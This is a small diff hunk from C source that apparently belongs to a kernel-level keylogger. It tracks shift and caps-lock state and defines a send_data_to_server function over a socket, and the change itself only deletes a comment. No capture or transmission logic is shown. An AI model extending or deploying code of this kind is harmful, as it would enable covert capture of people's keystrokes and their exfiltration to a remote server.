@@ -51,7 +51,6 @@ static struct sockaddr_in s_addr;
 short shift_pressed = 0;
 short capslock_state = 0;
 
-// Function to send data to the server
 static int send_data_to_server(const char *data)
 {
     struct kvec vec;
